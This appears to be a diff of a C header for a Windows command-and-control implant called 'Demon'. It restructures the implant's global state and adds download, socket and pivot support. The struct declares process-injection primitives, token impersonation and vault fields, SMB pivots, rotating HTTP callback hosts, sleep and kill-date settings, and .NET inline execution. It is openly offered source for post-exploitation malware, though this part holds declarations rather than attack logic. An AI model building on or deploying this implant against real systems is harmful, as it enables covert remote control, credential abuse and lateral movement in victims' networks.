@@ -4,9 +4,11 @@
 #include <windows.h>
 #include <winsock2.h>
 #include <ntstatus.h>
+#include <aclapi.h>
 
-#include <Common/EnviromentBlock.h>
+#include <Common/Native.h>
 #include <Common/Macros.h>
+#include <Common/Clr.h>
 
 #include <Core/WinUtils.h>
 #include <Core/Token.h>
@@ -14,17 +16,17 @@
 #include <Core/Spoof.h>
 #include <Core/Jobs.h>
 #include <Core/Package.h>
+#include <Core/Download.h>
+#include <Core/Transport.h>
+#include <Core/Socket.h>
 
 #include <Loader/CoffeeLdr.h>
 
-#define DEMON_MAGIC_VALUE   0xDEADBEEF
+#define DEMON_MAGIC_VALUE 0xDEADBEEF
 
 #ifdef DEBUG
 #include <stdio.h>
 #endif
-
-#define DLLEXPORT           __declspec( dllexport )
-#define DLL_QUERY_HMODULE   6
 
 #define WIN_VERSION_UNKNOWN 0
 #define WIN_VERSION_XP      1
@@ -70,23 +72,25 @@ typedef struct
     } Session;
 
     struct {
-        // Evasion
-        DWORD               Sleeping;
+        /* Sleep delay */
+        DWORD Sleeping;
 
-        // Kill Date
-        DWORD               KillDate;
+        /* Kill Date
+         * TODO: add this */
+        DWORD KillDate;
 
         struct {
 #ifdef TRANSPORT_HTTP
-            LPWSTR  Method;
-            LPWSTR* Hosts;
-            DWORD   HostRotation;
-            DWORD   HostIndex;
-            UINT32  Port;
-            DWORD   Secure;
-            LPWSTR  UserAgent;
-            LPWSTR* Uris;
-            LPWSTR* Headers;
+            PHOST_DATA Host;  /* current using host */
+            PHOST_DATA Hosts; /* host linked list */
+            LPWSTR     Method; /* TODO: use WCHAR[4] instead of LPWSTR. */
+            SHORT      HostRotation;
+            DWORD      HostIndex;
+            DWORD      HostMaxRetries;
+            DWORD      Secure;
+            LPWSTR     UserAgent;
+            LPWSTR*    Uris;
+            LPWSTR*    Headers;
 
             struct {
                 BOOL   Enabled;
@@ -110,6 +114,7 @@ typedef struct
             PVOID   ThreadStartAddr;
             BOOL    CoffeeThreaded;
             BOOL    CoffeeVeh;
+            DWORD   DownloadChunkSize;
         } Implant;
 
         struct
@@ -151,6 +156,7 @@ typedef struct
         WIN_FUNC( VirtualProtect )
         WIN_FUNC( VirtualAllocEx )
         WIN_FUNC( CreateFileW )
+        WIN_FUNC( GetFullPathNameW )
         WIN_FUNC( GetFileSize )
         WIN_FUNC( CreateNamedPipeW )
         WIN_FUNC( WaitNamedPipeW )
@@ -192,80 +198,28 @@ typedef struct
         WIN_FUNC( Wow64RevertWow64FsRedirection )
         WIN_FUNC( CopyFileW )
         WIN_FUNC( GetModuleHandleA )
+        WIN_FUNC( SetProcessValidCallTargets )
 
-        // Ntdll
-        NTSTATUS ( NTAPI *LdrLoadDll ) (
-                PWCHAR,
-                ULONG,
-                PUNICODE_STRING,
-                PHANDLE
-        );
-        NTSTATUS ( NTAPI* LdrGetProcedureAddress )(
-                PVOID,
-                PANSI_STRING,
-                ULONG,
-                PVOID*
-        );
-
+        /* Ntdll.dll */
+        WIN_FUNC( LdrLoadDll )
+        WIN_FUNC( LdrGetProcedureAddress )
         WIN_FUNC( RtlAllocateHeap )
-        PVOID ( NTAPI *RtlReAllocateHeap )(
-                PVOID,
-                ULONG,
-                PVOID,
-                ULONG
-        );
+        WIN_FUNC( RtlReAllocateHeap )
         WIN_FUNC( RtlFreeHeap )
-        ULONG ( WINAPI *RtlRandomEx ) (
-                PULONG
-        );
-        ULONG ( WINAPI *RtlNtStatusToDosError ) (
-                NTSTATUS Status
-        );
-        VOID ( WINAPI* RtlGetVersion ) (
-                POSVERSIONINFOEXW
-        );
-        VOID ( NTAPI* RtlExitUserThread ) (
-                NTSTATUS Status
-        );
-        VOID ( NTAPI* RtlExitUserProcess ) (
-                NTSTATUS Status
-        );
-        NTSTATUS ( NTAPI* RtlCreateTimer )(
-                HANDLE TimerQueueHandle,
-                HANDLE *Handle,
-                WAITORTIMERCALLBACKFUNC Function,
-                PVOID Context,
-                ULONG DueTime,
-                ULONG Period,
-                ULONG Flags
-        );
-        NTSTATUS ( NTAPI* RtlCreateTimerQueue ) (
-                PHANDLE TimerQueueHandle
-        );
-        NTSTATUS ( NTAPI* RtlDeleteTimerQueue ) (
-                HANDLE TimerQueueHandle
-        );
+        WIN_FUNC( RtlRandomEx )
+        WIN_FUNC( RtlNtStatusToDosError )
+        WIN_FUNC( RtlGetVersion )
+        WIN_FUNC( RtlExitUserThread )
+        WIN_FUNC( RtlExitUserProcess )
+        WIN_FUNC( RtlCreateTimer )
+        NTSTATUS ( NTAPI* RtlCreateTimerQueue ) ( PHANDLE TimerQueueHandle );
+        WIN_FUNC( RtlDeleteTimerQueue )
         WIN_FUNC( RtlCaptureContext );
-        PVOID ( NTAPI *RtlAddVectoredExceptionHandler ) (
-                ULONG FirstHandler,
-                PVECTORED_EXCEPTION_HANDLER VectoredHandler
-        );
-        ULONG ( NTAPI* RtlRemoveVectoredExceptionHandler ) (
-                PVOID VectoredHandlerHandle
-        );
-
+        WIN_FUNC( RtlAddVectoredExceptionHandler );
+        WIN_FUNC( RtlRemoveVectoredExceptionHandler );
         WIN_FUNC( NtClose );
-        NTSTATUS ( NTAPI* NtSetEvent ) (
-                HANDLE  EventHandle,
-                PLONG   PreviousState
-        );
-        NTSTATUS ( NTAPI* NtCreateEvent )(
-            PHANDLE            EventHandle,
-            ACCESS_MASK        DesiredAccess,
-            POBJECT_ATTRIBUTES ObjectAttributes,
-            EVENT_TYPE         EventType,
-            BOOLEAN            InitialState
-        );
+        WIN_FUNC( NtSetEvent );
+        WIN_FUNC( NtCreateEvent );
 
         // WinHTTP
         // NOTE: maybe change to WinInet
@@ -280,6 +234,7 @@ typedef struct
         WIN_FUNC( WinHttpWebSocketCompleteUpgrade )
         WIN_FUNC( WinHttpQueryDataAvailable )
         WIN_FUNC( WinHttpReadData )
+        WIN_FUNC( WinHttpQueryHeaders )
 
         // Mscoree
         HRESULT ( WINAPI *CLRCreateInstance ) ( REFCLSID clsid, REFIID riid, LPVOID* ppInterface );
@@ -299,6 +254,14 @@ typedef struct
         WIN_FUNC( CreateProcessWithTokenW )
         WIN_FUNC( CreateProcessWithLogonW )
         NTSTATUS ( WINAPI* SystemFunction032 ) ( struct ustring* data, struct ustring* key );
+        WIN_FUNC( FreeSid )
+        WIN_FUNC( SetSecurityDescriptorSacl )
+        WIN_FUNC( SetSecurityDescriptorDacl )
+        WIN_FUNC( InitializeSecurityDescriptor )
+        WIN_FUNC( AddMandatoryAce )
+        WIN_FUNC( InitializeAcl )
+        WIN_FUNC( AllocateAndInitializeSid )
+        WIN_FUNC( SetEntriesInAclW )
 
         // Thread Management
         WIN_FUNC( OpenThread )
@@ -367,295 +330,112 @@ typedef struct
         WIN_FUNC( NetShareEnum )
         WIN_FUNC( NetApiBufferFree )
 
-
-        WIN_FUNC( SetProcessValidCallTargets )
+        /* Ws2_32.dll */
+        WIN_FUNC( WSAStartup )
+        WIN_FUNC( WSACleanup )
+        WIN_FUNC( WSASocketA )
+        WIN_FUNC( ioctlsocket )
+        WIN_FUNC( bind )
+        WIN_FUNC( listen )
+        WIN_FUNC( accept )
+        WIN_FUNC( closesocket )
+        WIN_FUNC( recv )
+        WIN_FUNC( send )
 
     } Win32;
 
     struct
     {
         WIN_FUNC( NtOpenFile )
-
-        NTSTATUS ( NTAPI* NtOpenThread ) (
-                PHANDLE            ThreadHandle,
-                ACCESS_MASK        DesiredAccess,
-                POBJECT_ATTRIBUTES ObjectAttributes,
-                PCLIENT_ID         ClientId
-        );
-
-        NTSTATUS ( NTAPI* NtCreateSection ) (
-                PHANDLE            SectionHandle,
-                ACCESS_MASK        DesiredAccess,
-                POBJECT_ATTRIBUTES ObjectAttributes,
-                PLARGE_INTEGER     MaximumSize,
-                ULONG              SectionPageProtection,
-                ULONG              AllocationAttributes,
-                HANDLE             FileHandle
-        );
-
-        NTSTATUS ( NTAPI* NtMapViewOfSection ) (
-                HANDLE          SectionHandle,
-                HANDLE          ProcessHandle,
-                PVOID           *BaseAddress,
-                ULONG_PTR       ZeroBits,
-                SIZE_T          CommitSize,
-                PLARGE_INTEGER  SectionOffset,
-                PSIZE_T         ViewSize,
-                SECTION_INHERIT InheritDisposition,
-                ULONG           AllocationType,
-                ULONG           Win32Protect
-        );
-
-        NTSTATUS ( NTAPI* NtOpenProcess ) (
-                PHANDLE            ProcessHandle,
-                ACCESS_MASK        DesiredAccess,
-                POBJECT_ATTRIBUTES ObjectAttributes,
-                PCLIENT_ID         ClientId
-        );
-
-        NTSTATUS ( NTAPI* NtOpenProcessToken ) (
-                HANDLE      ProcessHandle,
-                ACCESS_MASK DesiredAccess,
-                PHANDLE     TokenHandle
-        );
-
-        NTSTATUS ( NTAPI* NtDuplicateToken ) (
-                HANDLE             ExistingTokenHandle,
-                ACCESS_MASK        DesiredAccess,
-                POBJECT_ATTRIBUTES ObjectAttributes,
-                BOOLEAN            EffectiveOnly,
-                TOKEN_TYPE         TokenType,
-                PHANDLE            NewTokenHandle
-        );
-
-        NTSTATUS ( NTAPI* NtQueueApcThread ) (
-                HANDLE               ThreadHandle,
-                PIO_APC_ROUTINE      ApcRoutine,
-                PVOID                ApcRoutineContext,
-                PIO_STATUS_BLOCK     ApcStatusBlock,
-                ULONG                ApcReserved
-        );
-
-        NTSTATUS ( NTAPI* NtSuspendThread ) (
-                HANDLE      ThreadHandle,
-                PULONG      PreviousSuspendCount
-        );
-
-        NTSTATUS ( NTAPI* NtResumeThread ) (
-                HANDLE      ThreadHandle,
-                PULONG      SuspendCount
-        );
-
-        NTSTATUS ( NTAPI* NtCreateEvent ) (
-                PHANDLE            EventHandle,
-                ACCESS_MASK        DesiredAccess,
-                POBJECT_ATTRIBUTES ObjectAttributes,
-                EVENT_TYPE         EventType,
-                BOOLEAN            InitialState
-        );
-
-        NTSTATUS ( NTAPI* NtCreateThreadEx ) (
-                PHANDLE     hThread,
-                ACCESS_MASK DesiredAccess,
-                PVOID       ObjectAttributes,
-                HANDLE      ProcessHandle,
-                PVOID       lpStartAddress,
-                PVOID       lpParameter,
-                ULONG       Flags,
-                SIZE_T      StackZeroBits,
-                SIZE_T      SizeOfStackCommit,
-                SIZE_T      SizeOfStackReserve,
-                PVOID       lpBytesBuffer
-        );
-
-        NTSTATUS ( NTAPI* NtDuplicateObject )(
-                HANDLE      SourceProcessHandle,
-                HANDLE      SourceHandle,
-                HANDLE      TargetProcessHandle,
-                PHANDLE     TargetHandle,
-                ACCESS_MASK DesiredAccess,
-                ULONG       HandleAttributes,
-                ULONG       Options
-        );
-
-        NTSTATUS ( NTAPI* NtGetContextThread ) (
-                HANDLE      ThreadHandle,
-                PCONTEXT    pContext
-        );
-
-        NTSTATUS ( NTAPI* NtSetContextThread ) (
-                HANDLE      ThreadHandle,
-                PCONTEXT    pContext
-        );
-
-        NTSTATUS ( NTAPI* NtQueryInformationProcess ) (
-                HANDLE           ProcessHandle,
-                PROCESSINFOCLASS ProcessInformationClass,
-                PVOID            ProcessInformation,
-                ULONG            ProcessInformationLength,
-                PULONG           ReturnLength
-        );
-
-        NTSTATUS ( NTAPI* NtQuerySystemInformation ) (
-                SYSTEM_INFORMATION_CLASS SystemInformationClass,
-                PVOID                    SystemInformation,
-                ULONG                    SystemInformationLength,
-                PULONG                   ReturnLength
-        );
-
-        NTSTATUS ( NTAPI* NtWaitForSingleObject ) (
-                HANDLE          Handle,
-                BOOLEAN         Alertable,
-                PLARGE_INTEGER  Timeout
-        );
-
-        NTSTATUS ( NTAPI* NtTestAlert ) ( VOID );
-
-        NTSTATUS ( NTAPI* NtAllocateVirtualMemory ) (
-                HANDLE    ProcessHandle,
-                PVOID     *BaseAddress,
-                ULONG_PTR ZeroBits,
-                PSIZE_T   RegionSize,
-                ULONG     AllocationType,
-                ULONG     Protect
-        );
-
-        NTSTATUS ( NTAPI* NtFlushInstructionCache ) (
-                HANDLE  ProcessHandle,
-                PVOID   BaseAddress,
-                ULONG   NumberOfBytesToFlush
-        );
-
-        NTSTATUS ( NTAPI* NtWriteVirtualMemory ) (
-                HANDLE  ProcessHandle,
-                PVOID   BaseAddress,
-                PVOID   Buffer,
-                ULONG   NumberOfBytesToWrite,
-                PULONG  NumberOfBytesWritten
-        );
-
-        NTSTATUS ( NTAPI* NtReadVirtualMemory ) (
-                HANDLE  ProcessHandle,
-                PVOID   BaseAddress,
-                PVOID   Buffer,
-                ULONG   NumberOfBytesToRead,
-                PULONG  NumberOfBytesReaded
-        );
-
-        NTSTATUS ( NTAPI* NtFreeVirtualMemory ) (
-                HANDLE  ProcessHandle,
-                PVOID   *BaseAddress,
-                PSIZE_T RegionSize,
-                ULONG   FreeType
-        );
-
-        NTSTATUS ( NTAPI* NtProtectVirtualMemory ) (
-                HANDLE  ProcessHandle,
-                PVOID   *BaseAddress,
-                PULONG  RegionSize,
-                ULONG   NewProtect,
-                PULONG  OldProtect
-        );
-
-
-        NTSTATUS ( NTAPI* NtTerminateThread ) (
-                HANDLE      ThreadHandle,
-                NTSTATUS    ExitStatus
-        );
-
-        NTSTATUS ( NTAPI* NtContinue ) (
-                PCONTEXT    ThreadContext,
-                BOOLEAN     RaiseAlert
-        );
-
-        NTSTATUS ( NTAPI* NtAlertResumeThread ) (
-                HANDLE  ThreadHandle,
-                PULONG  SuspendCount
-        );
-
-        NTSTATUS ( NTAPI* NtSignalAndWaitForSingleObject ) (
-                HANDLE          ObjectToSignal,
-                HANDLE          WaitableObject,
-                BOOLEAN         Alertable,
-                PLARGE_INTEGER  Time
-        );
-
-        NTSTATUS ( NTAPI* NtQueryVirtualMemory )(
-                HANDLE                   ProcessHandle,
-                PVOID                    BaseAddress,
-                MEMORY_INFORMATION_CLASS MemoryInformationClass,
-                PVOID                    MemoryInformation,
-                SIZE_T                   MemoryInformationLength,
-                PSIZE_T                  ReturnLength
-        );
-
-        NTSTATUS ( NTAPI *NtQueryInformationToken )(
-            HANDLE                  TokenHandle,
-            TOKEN_INFORMATION_CLASS TokenInformationClass,
-            PVOID                   TokenInformation,
-            ULONG                   TokenInformationLength,
-            PULONG                  ReturnLength
-        );
-
-        NTSTATUS ( NTAPI* NtQueryInformationThread ) (
-            HANDLE          ThreadHandle,
-            THREADINFOCLASS ThreadInformationClass,
-            PVOID           ThreadInformation,
-            ULONG           ThreadInformationLength,
-            PULONG          ReturnLength
-        );
-
+        WIN_FUNC( NtOpenThread )
+        WIN_FUNC( NtOpenProcess )
+        WIN_FUNC( NtOpenProcessToken )
+        WIN_FUNC( NtCreateSection )
+        WIN_FUNC( NtMapViewOfSection )
+        WIN_FUNC( NtDuplicateToken )
+        WIN_FUNC( NtQueueApcThread )
+        WIN_FUNC( NtSuspendThread )
+        WIN_FUNC( NtResumeThread )
+        WIN_FUNC( NtCreateEvent )
+        WIN_FUNC( NtCreateThreadEx )
+        WIN_FUNC( NtDuplicateObject )
+        WIN_FUNC( NtGetContextThread )
+        WIN_FUNC( NtSetContextThread )
+        WIN_FUNC( NtQueryInformationProcess )
+        WIN_FUNC( NtQuerySystemInformation )
+        WIN_FUNC( NtWaitForSingleObject )
+        WIN_FUNC( NtTestAlert )
+        WIN_FUNC( NtAllocateVirtualMemory )
+        WIN_FUNC( NtWriteVirtualMemory )
+        WIN_FUNC( NtReadVirtualMemory )
+        WIN_FUNC( NtFreeVirtualMemory )
+        WIN_FUNC( NtProtectVirtualMemory )
+        WIN_FUNC( NtFlushInstructionCache )
+        WIN_FUNC( NtTerminateThread )
+        WIN_FUNC( NtContinue )
+        WIN_FUNC( NtAlertResumeThread )
+        WIN_FUNC( NtSignalAndWaitForSingleObject )
+        WIN_FUNC( NtQueryVirtualMemory )
+        WIN_FUNC( NtQueryInformationToken )
+        WIN_FUNC( NtQueryInformationThread )
     } Syscall ;
 
-    struct {
-        PVOID  Kernel32;
-        PVOID  Advapi32;
-        PVOID  Crypt32;
-        PVOID  CryptSp;
-        PVOID  Mscoree;
-        PVOID  Oleaut32;
-        PVOID  Ntdll;
-        PVOID  User32;
-        PVOID  Shell32;
-        PVOID  Msvcrt;
-        PVOID  KernelBase;
-        PVOID  Iphlpapi;
-        PVOID  Gdi32;
-        PVOID  Wkscli;
-        PVOID  NetApi32;
-
-#ifdef TRANSPORT_TCP
-        PVOID  Ws2_32;
-#endif
+    struct
+    {
+        PVOID Kernel32;
+        PVOID Advapi32;
+        PVOID Crypt32;
+        PVOID CryptSp;
+        PVOID Mscoree;
+        PVOID Oleaut32;
+        PVOID Ntdll;
+        PVOID User32;
+        PVOID Shell32;
+        PVOID Msvcrt;
+        PVOID KernelBase;
+        PVOID Iphlpapi;
+        PVOID Gdi32;
+        PVOID Wkscli;
+        PVOID NetApi32;
+        PVOID Ws2_32;
 
 #ifdef TRANSPORT_HTTP
-        PVOID  WinHttp;
+        PVOID WinHttp;
 #endif
-    } Modules ;
+    } Modules;
 
-    _PTEB               ThreadEnvBlock;
+    /* The main thread environment block */
+    PTEB  Teb;
 
-    // global linked lists
+    /* Thread counter. how many threads that are using our code are running ? */
+    DWORD  Threads;
 
+    /* Buffer to use for allocating download chunks. */
+    BUFFER DownloadChunk;
+
+    /* This is a global variable for dotnet inline-execute
+     * holds our CLR instance, assembly and where to output. */
+    PDOTNET_ARGS Dotnet;
+
+    /* Linked lists */
     struct {
         PTOKEN_LIST_DATA Vault;
+
+        /* Impersonate token. */
         PTOKEN_LIST_DATA Token;
         BOOL             Impersonate;
     } Tokens;
+    PPIVOT_DATA          SmbPivots;
+    PJOB_DATA            Jobs;
+    PDOWNLOAD_DATA       Downloads;
+    PSOCKET_DATA         Sockets;
 
-    PPIVOT_DATA  SmbPivots;
-    PJOB_DATA    Jobs;
-
-    // Counter of current running threads created by our agent.
-    DWORD Threads;
-
-} INSTANCE, *PINSTANCE ;
+} INSTANCE;
 
 extern INSTANCE Instance;
 
 VOID DemonMain( PVOID ModuleInst );
-
-_Noreturn VOID DemonRoutine( );
+VOID DemonRoutine( );
 VOID DemonInit( VOID );
 VOID DemonMetaData( PPACKAGE* Package, BOOL Header );
 VOID DemonConfig();
